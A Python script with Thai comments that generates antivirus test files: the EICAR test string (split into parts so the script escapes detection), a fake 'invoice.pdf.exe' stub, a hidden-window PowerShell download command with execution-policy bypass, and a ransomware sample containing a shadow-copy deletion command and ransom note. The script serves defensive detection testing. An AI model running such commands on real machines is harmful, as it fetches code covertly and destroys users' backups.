"""
สร้างไฟล์ทดสอบ EICAR — ไฟล์ทดสอบมาตรฐานสากลที่ AV ทุกตัวต้องตรวจเจอ
⚠️ ไฟล์นี้ "ไม่ใช่ไวรัส" และไม่ทำอันตรายใด ๆ แต่ AV ในเครื่องคุณอาจเตือน
   ซึ่งเป็นเรื่องปกติและเป็นจุดประสงค์ของมันพอดี
"""
from pathlib import Path

# ประกอบสตริงจากชิ้นส่วน เพื่อไม่ให้ไฟล์ .py นี้โดน AV จับเอง
PARTS = [
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}",
    r"$EICAR-STANDARD-ANTIVIRUS-TEST-FILE",
    r"!$H+H*",
]

OUT = Path(__file__).resolve().parent.parent / "testfiles"


def main():
    OUT.mkdir(exist_ok=True)
    payload = "".join(PARTS).encode("ascii")

    # 1) ไฟล์ EICAR มาตรฐาน
    (OUT / "eicar_test.com").write_bytes(payload)

    # 2) ทดสอบการตรวจจับนามสกุลซ้อน
    (OUT / "invoice.pdf.exe").write_bytes(b"MZ\x90\x00" + b"\x00" * 200)

    # 3) ทดสอบกฎ YARA เรื่อง PowerShell
    (OUT / "suspicious_script.ps1").write_text(
        'powershell -WindowStyle Hidden -ExecutionPolicy Bypass '
        '-Command "Invoke-WebRequest http://example.invalid/x"',
        encoding="utf-8")

    # 4) ทดสอบกฎ Ransomware indicators
    (OUT / "ransom_sim.txt").write_text(
        "vssadmin delete shadows /all /quiet\n"
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "send bitcoin wallet to recover\n", encoding="utf-8")

    print(f"✅ สร้างไฟล์ทดสอบ 4 ไฟล์ที่: {OUT}")
    print("   ให้ใช้ ThaiGuard AV สแกนโฟลเดอร์นี้เพื่อดูผล")


if __name__ == "__main__":
    main()
